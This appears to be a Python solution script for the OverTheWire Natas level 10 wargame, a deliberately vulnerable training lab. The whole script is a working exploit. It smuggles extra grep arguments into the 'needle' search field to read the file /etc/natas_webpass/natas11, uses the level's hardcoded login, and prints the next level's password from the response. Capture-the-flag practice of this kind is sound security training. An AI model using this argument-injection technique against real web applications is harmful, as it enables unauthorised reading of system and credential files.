import requests
import re
import urllib.parse

payload = """. /etc/natas_webpass/natas11 #"""

url = "http://natas10.natas.labs.overthewire.org/?needle=%s&submit=Search" %(urllib.parse.quote_plus(payload))
user = "natas10"
password = "D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE"

r = requests.get(url, auth=(user, password))

result = re.findall(r"\b\w{32}\b", r.text)[1]

print("Natas11:"+result)

